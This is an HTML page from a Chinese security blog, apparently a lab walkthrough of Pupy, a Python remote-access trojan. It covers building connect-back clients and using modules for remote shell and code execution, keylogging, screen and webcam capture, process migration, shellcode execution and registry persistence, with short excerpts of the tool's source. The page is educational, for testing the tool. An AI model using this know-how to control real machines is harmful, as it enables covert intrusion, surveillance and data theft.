@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Python远控Pupy使用帮助</title>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="blog, accent, Larryxi, Larryxi's blog, jekyll">
+    <meta name="author" content="Larryxi">
+    
+    
+        
+    
+    
+        
+    
+    <meta name="description" content="Larryxi's blog,learn security everyday.
+">
+    <link href='https://fonts.googleapis.com/css?family=Roboto+Mono:400,300,500,700|Ubuntu:400,300,300italic,500,700|Montserrat' rel='stylesheet' type='text/css'>
+    <link rel="alternate" type="application/rss+xml" title="Larryxi's blog RSS" href="/feed.xml" />
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="icon" type="image/ico" href="images/favicon.ico">
+        <link rel="shortcut-icon" type="image/ico" href="images/favicon.ico">
+    
+    
+    <!-- Facebook Open Graph -->
+    <meta name="og:description" content="Larryxi's blog,learn security everyday.
+">
+    <meta name="og:title" content="Larryxi's blog">
+    <meta name="og:url" content="/pupy-first-touch-101.html">
+    <meta name="og:type" content="article">
+    
+    
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Larryxi's blog">
+    <meta name="twitter:description" content="Larryxi's blog,learn security everyday.
+">
+    <meta name="twitter:url" content="/pupy-first-touch-101.html">
+    
+        <meta name="twitter:image" content="images/lubang.jpg">
+    
+</head>
+<body>
+    <div class="wrapper">
+        <div class="main">
+            <nav class="navbar">
+                <a href="/">
+                    <span class="alignable pull-left back-outer">
+                        <span class="alignable pull-left back-inner">
+                        </span>
+                    </span>
+                </a>
+            </nav>
+            <div class="content container">
+    <div class="post-date">
+        <time>October 09, 2015 </time>
+    </div>
+    <h1 class="post-title">Python远控Pupy使用帮助</h1>
+    <h1 id="x00-">0x00 前言</h1>
+
+<hr />
+
+<p>菜鸡我总结一下一个python远控——pupy的使用帮助，github地址为：<a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a>，作者对其能够实现的功能写得很清除。其主要依赖rpyc来实现远程控制，并且使用Python作为脚本语言从而实现跨平台操作，再使用PupyServer和PupyCmd的继承，实现控制端的主要功能，各个模块均继承自PupyModules来通过run命令实现对应模块功能。</p>
+
+<p><img src="/images/20151008/dir1.png" alt="" /></p>
+
+<p>client目录存放客户端（受控端）脚本以及一些源文件，docs则是说明文档相关，pupy则是服务端（控制端）相关脚本</p>
+
+<p><img src="/images/20151008/dir2.png" alt="" /></p>
+
+<p>cypto中是一些方向ssl连接需要的证书文件，modules中是一些run命令运行的模块脚本，packages中是不同平台上实现模块功能的根本脚本，payload_templates则是生成客户端exe及dll的模板，pupylib中是服务端核心功能中几个重要的类文件，pupy.conf是配置文件设置服务地址端口，颜色显示及命令别名，pupygen.py生成Windows平台上的exe或dll客户端，pupysh.py则是pypushell主程序</p>
+
+<h1 id="x01-">0x01 准备</h1>
+
+<hr />
+
+<h2 id="windows">1.生成Windows上的客户端</h2>
+
+<p>github的ReadMe里面都写得很清楚，这里我开了3个虚拟机，服务端（主控端）的Kali2（172.16.162.130），客户端（受控端）的xp（172.16.162.133）和Kali（172.16.162.129），穷屌我这里就不测试Mac了</p>
+
+<p>对于Windows主要是通过pupy文件夹下的pupygen.py生成对应x86或x64平台的exe或dll（用于反向注射）</p>
+
+<p><img src="/images/20151008/1.png" alt="" /></p>
+
+<p>host为回连主机地址，-p指定回连端口，-t指定生成文件类型，-o指定生成文件名,然后生成对应二进制文件</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">i</span><span class="o">=</span><span class="n">binary</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&quot;&lt;default_connect_back_host&gt;:&lt;default_connect_back_port&gt;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="o">...</span>
+<span class="n">new_host</span><span class="o">=</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="se">\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>
+<span class="o">...</span>
+<span class="n">binary</span><span class="o">=</span><span class="n">binary</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">+</span><span class="n">new_host</span><span class="o">+</span><span class="n">binary</span><span class="p">[</span><span class="n">offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">new_host</span><span class="p">):]</span></code></pre></div>
+
+<p>找到二进制文件中对应的标志位，再将host及ip写入</p>
+
+<p><img src="/images/20151008/2.png" alt="" /></p>
+
+<h2 id="kali">2.生成Kali上的客户端</h2>
+
+<p>Windows平台下如果有Python，rpyc，pupy也是类似的</p>
+
+<p><img src="/images/20151008/3.png" alt="" /></p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">rhost</span><span class="p">,</span><span class="n">rport</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span>
+        <span class="n">tab</span><span class="o">=</span><span class="n">HOST</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">rhost</span><span class="o">=</span><span class="n">tab</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">tab</span><span class="p">)</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
+            <span class="n">rport</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">tab</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">rport</span><span class="o">=</span><span class="mi">443</span>
+        <span class="k">print</span> <span class="s">&quot;connecting to </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span><span class="n">rport</span><span class="p">)</span>
+        <span class="n">conn</span><span class="o">=</span><span class="n">rpyc</span><span class="o">.</span><span class="n">ssl_connect</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">service</span> <span class="o">=</span> <span class="n">ReverseSlaveService</span><span class="p">)</span></code></pre></div>
+
+<p>默认是443端口并以冒号分割，再使用rpyc模块进行ssl连接到控制端，循环等待并打印出连接信息</p>
+
+<h1 id="x02-">0x02 开始</h1>
+
+<hr />
+
+<p>直接运行pupy/pupy/pupysh.py便可以启用客户端（pupyshell），自然使用help或?查看帮助</p>
+
+<p><img src="/images/20151008/4.png" alt="" /></p>
+
+<p>在pupysh.py中主要是导入pupylib.PupyServer和pupylib.PupyCmd，分别实例化，并使用PupyCmd继承cmd.Cmd中的cmdloop()方法，来解析并执行命令</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">...</span>
+<span class="n">pupyServer</span><span class="o">=</span><span class="n">pupylib</span><span class="o">.</span><span class="n">PupyServer</span><span class="o">.</span><span class="n">PupyServer</span><span class="p">()</span>
+<span class="o">...</span>
+<span class="n">pupyServer</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">pcmd</span><span class="o">=</span><span class="n">pupylib</span><span class="o">.</span><span class="n">PupyCmd</span><span class="o">.</span><span class="n">PupyCmd</span><span class="p">(</span><span class="n">pupyServer</span><span class="p">)</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">pcmd</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span></code></pre></div>
+
+<p>有趣的是在有中文版xp的受控端进入后，使用clients或sessions命令时均会出现如下错误</p>
+
+<p><img src="/images/20151008/error.png" alt="" /></p>
+
+<p>看是解码错误，便在pupylib/PupyCmd.py中在导入模块后再添加以下代码就okay啦</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">getdefaultencoding</span><span class="p">()</span><span class="o">!=</span><span class="s">&#39;gbk&#39;</span><span class="p">:</span>
+  <span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+  <span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;gbk&#39;</span><span class="p">)</span></code></pre></div>
+
+<h2 id="clients">clients</h2>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_clients</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; alias for sessions &quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">do_sessions</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span></code></pre></div>
+
+<p>可以看出来是和sessions的功能一样</p>
+
+<h2 id="sessions">sessions</h2>
+
+<p><img src="/images/20151008/5.png" alt="" /></p>
+
+<p>-i是设置过滤器（也可用于其他命令），-g重置过滤器，-l列出所有存活会话，-k杀死选择会话</p>
+
+<p>会话则会列举出”id”, “user”, “hostname”, “platform”, “release”, “os_arch”, “address”这些值</p>
+
+<h2 id="exit">exit</h2>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+        <span class="sd">&quot;&quot;&quot; Quit Pupy Shell &quot;&quot;&quot;</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div>
+
+<p>直接退出，没什么好说的</p>
+
+<h2 id="jobs">jobs</h2>
+
+<p><img src="/images/20151008/6.png" alt="" /></p>
+
+<p>-h帮助，-l列举出所有任务，-k后接job_id杀死该job，-p后接job_id打印出该job输出</p>
+
+<h2 id="python">python</h2>
+
+<p><img src="/images/20151008/7.png" alt="" /></p>
+
+<p>运行本地的Python环境，用于调试</p>
+
+<h2 id="read">read</h2>
+
+<p><img src="/images/20151008/8.png" alt="" /></p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; execute a list of commands from a file &quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">arg</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">display_error</span><span class="p">(</span><span class="s">&quot;usage: read &lt;filename&gt;&quot;</span><span class="p">)</span>
+            <span class="k">return</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">cmdqueue</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">())</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">display_error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></code></pre></div>
+
+<p>接受一个文件，并逐行执行命令</p>
+
+<h1 id="x03-run">0x03 run</h1>
+
+<hr />
+
+<p>首先来介绍一下list_moudules和run命令（和msf很类似）</p>
+
+<h2 id="listmodules">list_modules</h2>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">PupyCmd</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
+<span class="k">def</span> <span class="nf">do_list_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; List available modules with a brief description &quot;&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">m</span><span class="p">,</span><span class="n">d</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">pupsrv</span><span class="o">.</span><span class="n">list_modules</span><span class="p">():</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;{:&lt;20}   {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">color</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="s">&#39;grey&#39;</span><span class="p">)))</span>
+
+<span class="n">PupyServer</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
+<span class="k">def</span> <span class="nf">list_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="n">l</span><span class="o">=</span><span class="p">[]</span>
+    <span class="k">for</span> <span class="n">loader</span><span class="p">,</span> <span class="n">module_name</span><span class="p">,</span> <span class="n">is_pkg</span> <span class="ow">in</span> <span class="n">pkgutil</span><span class="o">.</span><span class="n">iter_modules</span><span class="p">(</span><span class="n">modules</span><span class="o">.</span><span class="n">__path__</span><span class="p">):</span>
+        <span class="n">module</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">get_module</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>
+        <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">module_name</span><span class="p">,</span><span class="n">module</span><span class="o">.</span><span class="n">__doc__</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">l</span></code></pre></div>
+
+<p>将modules包中脚本所包含的modules都列举出来，并附加简要说明</p>
+
+<p><img src="/images/20151008/9.png" alt="" /></p>
+
+<p>各模块支持的平台如下</p>
+
+<ul>
+  <li>migrate (windows only)
+    <ul>
+      <li>inter process architecture injection also works (x86-&gt;x64 and x64-&gt;x86)</li>
+    </ul>
+  </li>
+  <li>keylogger (windows only)</li>
+  <li>persistence (windows only)</li>
+  <li>screenshot (windows only)</li>
+  <li>webcam snapshot (windows only)</li>
+  <li>command execution</li>
+  <li>download</li>
+  <li>upload</li>
+  <li>socks5 proxy</li>
+  <li>local port forwarding</li>
+  <li>interactive shell (cmd.exe, /bin/sh, …)</li>
+  <li>interactive python shell</li>
+  <li>shellcode exec (thanks to @byt3bl33d3r)</li>
+</ul>
+
+<h2 id="run">run</h2>
+
+<p>run命令则是直接运行这些模块</p>
+
+<p><img src="/images/20151008/10.png" alt="" /></p>
+
+<p>-h帮助，-f设置客户端过滤条件，–bg后台运行，后接模块及其参数</p>
+
+<p>对于过滤条件的设置，可以直接指定clients输出id值，或者是其他冒号分割的名值对</p>
+
+<p>在pupy.conf文件中，主命令info，ps，migrate，exec，pyexe，kill分别具有run modules功能中的别名get_info，ps，migrate，shell_exec，pyexe，process_kill</p>
+
+<p>下面介绍一下相关模块的功能</p>
+
+<h3 id="interactiveshell">interactive_shell</h3>
+
+<p>交互shell所有平台均支持，这里我把显示Windows的编码换成了cp936，可以良好显示中文啦</p>
+
+<p><img src="/images/20151008/11.png" alt="" /></p>
+
+<h3 id="shellexec">shell_exec</h3>
+
+<p>直接执行远程shell命令，Windows上的编码还是换成cp936</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">shell_exec</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
+<span class="o">...</span>
+<span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">is_windows</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;cp936&#39;</span><span class="p">)</span><span class="c">#437&#39;)</span></code></pre></div>
+
+<p><img src="/images/20151008/16.png" alt="" /></p>
+
+<h3 id="pyshell">pyshell</h3>
+
+<p>开启远程Python交互shell</p>
+
+<p><img src="/images/20151008/17.png" alt="" /></p>
+
+<h3 id="pyexec">pyexec</h3>
+
+<p>直接在远程系统上执行Python代码，–file接文件或-c接代码</p>
+
+<p><img src="/images/20151008/18.png" alt="" /></p>
+
+<h3 id="download">download</h3>
+
+<p>通过使用<code>from rpyc.utils.classic import download</code>，实现从远程系统上下载文件</p>
+
+<p><img src="/images/20151008/12.png" alt="" /></p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">remote_file</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;os.path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">remote_file</span><span class="p">)</span>
+<span class="n">rep</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;data&quot;</span><span class="p">,</span><span class="s">&quot;downloads&quot;</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">short_name</span><span class="p">())</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">local_file</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">rep</span><span class="p">)</span></code></pre></div>
+
+<p>如果未指明本地路径，则存储在/data/downloads中</p>
+
+<h3 id="upload">upload</h3>
+
+<p>通过使用<code>from rpyc.utils.classic import upload</code>实现上传，功能与download相仿</p>
+
+<p><img src="/images/20151008/13.png" alt="" /></p>
+
+<h3 id="search">search</h3>
+
+<p>在指定path中搜索string</p>
+
+<p><img src="/images/20151008/search.png" alt="" /></p>
+
+<h3 id="getinfo">get_info</h3>
+
+<p>获取受控端平台信息</p>
+
+<p><img src="/images/20151008/14.png" alt="" /></p>
+
+<h3 id="exit-1">exit</h3>
+
+<p>退出受控端并确认</p>
+
+<p><img src="/images/20151008/15.png" alt="" /></p>
+
+<h3 id="ps">ps</h3>
+
+<p>列出进程，默认给出’username’, ‘pid’, ‘arch’, ‘exe’的信息，-a则给出’username’, ‘pid’, ‘arch’, ‘name’, ‘exe’, ‘cmdline’, ‘status’</p>
+
+<p><img src="/images/20151008/19.png" alt="" /></p>
+
+<p><img src="/images/20151008/20.png" alt="" /></p>
+
+<h3 id="getprivs">getprivs</h3>
+
+<p>获取SeDebug权限</p>
+
+<h3 id="processkill">process_kill</h3>
+
+<p>杀死pid进程</p>
+
+<p><img src="/images/20151008/21.png" alt="" /></p>
+
+<h3 id="socks5proxy">socks5proxy</h3>
+
+<p>开启socks5代理，-p指定端口</p>
+
+<p><img src="/images/20151008/22.png" alt="" /></p>
+
+<h3 id="portfwd">portfwd</h3>
+
+<p>本地或远程端口转发，远程端口转发还未开发，本地端口转发则是<code>-L [&lt;LOCAL_ADDR&gt;]:&lt;LOCAL_PORT&gt;:&lt;REMOTE_ADDR&gt;:&lt;REMOTE_PORT&gt;</code>，-k则kill掉对应的id转发（id依次增一）</p>
+
+<p><img src="/images/20151008/portfwd.png" alt="" /></p>
+
+<h3 id="shellexec-1">shell_exec</h3>
+
+<p>直接执行shellcode</p>
+
+<p><img src="/images/20151008/shellcode_exec.png" alt="" /></p>
+
+<h3 id="keylogger">keylogger</h3>
+
+<p>键盘记录</p>
+
+<p><img src="/images/20151008/23.png" alt="" /></p>
+
+<h3 id="screenshot">screenshot</h3>
+
+<p>截屏，-e遍历屏幕，-s SCREEN指定特定的屏幕（穷吊没验证），-v截屏后直接预览</p>
+
+<p><img src="/images/20151008/24.png" alt="" /></p>
+
+<h3 id="webcamsnap">webcamsnap</h3>
+
+<p>捕捉网络摄像头，-d DEVICE指定特定的设备（同没验证），-v捕捉后直接预览</p>
+
+<h3 id="migrate">migrate</h3>
+
+<p>迁移至其他进程（由pid指定）</p>
+
+<p><img src="/images/20151008/migrate.png" alt="" /></p>
+
+<h3 id="persistence">persistence</h3>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">persistence</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
+<span class="o">...</span> 
+<span class="n">remote_path</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;os.path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="s">&quot;%TEMP%</span><span class="se">\\</span><span class="s">{}.exe&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">12</span><span class="p">))])))</span></code></pre></div>
+
+<p>权限维持，写入到注册表中（对应临时目录下的随机命令exe），并开机启动</p>
+
+<p><img src="/images/20151008/persistence.png" alt="" /></p>
+
+<h3 id="msgbox">msgbox</h3>
+
+<p>最后作者示范了一下如何编写这个msgbox模块</p>
+
+<p>首先新建一个pupy/packages/windows/all/pupwinutils/msgbox.py ，再写一个你想导入受控端的类或函数</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">import</span> <span class="nn">threading</span>    
+
+<span class="k">def</span> <span class="nf">MessageBox</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">title</span><span class="p">):</span>
+    <span class="n">t</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">MessageBoxA</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+    <span class="n">t</span><span class="o">.</span><span class="n">daemon</span><span class="o">=</span><span class="bp">True</span>
+    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span></code></pre></div>
+
+<p>然后再创建一个模块来导入我们包和调用我们的函数</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">MsgBoxPopup</span><span class="p">(</span><span class="n">PupyModule</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Pop up a custom message box &quot;&quot;&quot;</span>    
+
+    <span class="k">def</span> <span class="nf">init_argparse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span> <span class="o">=</span> <span class="n">PupyArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">&quot;msgbox&quot;</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">__doc__</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;--title&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;msgbox title&#39;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;text&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;text to print in the msgbox :)&#39;</span><span class="p">)</span>    
+
+    <span class="nd">@windows_only</span>
+    <span class="k">def</span> <span class="nf">is_compatible</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">pass</span>    
+
+    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">load_package</span><span class="p">(</span><span class="s">&quot;pupwinutils.msgbox&quot;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;pupwinutils.msgbox&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">MessageBox</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">title</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s">&quot;message box popped !&quot;</span><span class="p">)</span></code></pre></div>
+
+<p>title指定标题，再接内容</p>
+
+<p><img src="/images/20151008/msg.png" alt="" /></p>
+
+
+</div>
+<div class="container">
+    <ul class="rrssb-buttons clearfix">
+    <li class="rrssb-email">
+    <!-- Replace subject with your message using URL Endocding: http://meyerweb.com/eric/tools/dencoder/ -->
+        <a href="mailto:?subject=Python远控Pupy使用帮助&amp;body=Check out: /pupy-first-touch-101.html">
+            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><path d="M20.11 26.147c-2.335 1.05-4.36 1.4-7.124 1.4C6.524 27.548.84 22.916.84 15.284.84 7.343 6.602.45 15.4.45c6.854 0 11.8 4.7 11.8 11.252 0 5.684-3.193 9.265-7.398 9.3-1.83 0-3.153-.934-3.347-2.997h-.077c-1.208 1.986-2.96 2.997-5.023 2.997-2.532 0-4.36-1.868-4.36-5.062 0-4.75 3.503-9.07 9.11-9.07 1.713 0 3.7.4 4.6.972l-1.17 7.203c-.387 2.298-.115 3.3 1 3.4 1.674 0 3.774-2.102 3.774-6.58 0-5.06-3.27-8.994-9.304-8.994C9.05 2.87 3.83 7.545 3.83 14.97c0 6.5 4.2 10.2 10 10.202 1.987 0 4.09-.43 5.647-1.245l.634 2.22zM16.647 10.1c-.31-.078-.7-.155-1.207-.155-2.572 0-4.596 2.53-4.596 5.53 0 1.5.7 2.4 1.9 2.4 1.44 0 2.96-1.83 3.31-4.088l.592-3.72z"/></svg></span>
+            <span class="rrssb-text">email</span>
+        </a>
+    </li>
+    <li class="rrssb-facebook">
+<!--  Replace with your URL. For best results, make sure you page has the proper FB Open Graph tags in header: https://developers.facebook.com/docs/opengraph/howtos/maximizing-distribution-media-content/ -->
+        <a href="https://www.facebook.com/sharer/sharer.php?u=/pupy-first-touch-101.html" class="popup">
+            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 29 29"><path d="M26.4 0H2.6C1.714 0 0 1.715 0 2.6v23.8c0 .884 1.715 2.6 2.6 2.6h12.393V17.988h-3.996v-3.98h3.997v-3.062c0-3.746 2.835-5.97 6.177-5.97 1.6 0 2.444.173 2.845.226v3.792H21.18c-1.817 0-2.156.9-2.156 2.168v2.847h5.045l-.66 3.978h-4.386V29H26.4c.884 0 2.6-1.716 2.6-2.6V2.6c0-.885-1.716-2.6-2.6-2.6z"/></svg></span>
+            <span class="rrssb-text">facebook</span>
+        </a>
+    </li>
+    <li class="rrssb-twitter">
+        <!-- Replace href with your Meta and URL information  -->
+        <a href="https://twitter.com/intent/tweet?text=Python远控Pupy使用帮助&amp;url=/pupy-first-touch-101.html" class="popup">
+            <span class="rrssb-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><path d="M24.253 8.756C24.69 17.08 18.297 24.182 9.97 24.62a15.093 15.093 0 0 1-8.86-2.32c2.702.18 5.375-.648 7.507-2.32a5.417 5.417 0 0 1-4.49-3.64c.802.13 1.62.077 2.4-.154a5.416 5.416 0 0 1-4.412-5.11 5.43 5.43 0 0 0 2.168.387A5.416 5.416 0 0 1 2.89 4.498a15.09 15.09 0 0 0 10.913 5.573 5.185 5.185 0 0 1 3.434-6.48 5.18 5.18 0 0 1 5.546 1.682 9.076 9.076 0 0 0 3.33-1.317 5.038 5.038 0 0 1-2.4 2.942 9.068 9.068 0 0 0 3.02-.85 5.05 5.05 0 0 1-2.48 2.71z"/></svg></span>
+            <span class="rrssb-text">twitter</span>
+        </a>
+    </li>
+    <li class="rrssb-linkedin">
+        <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=/pupy-first-touch-101.html&amp;title=Python远控Pupy使用帮助&amp;summary=Python远控Pupy使用帮助" class="popup">
+            <span class="rrssb-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewbox="0 0 28 28">
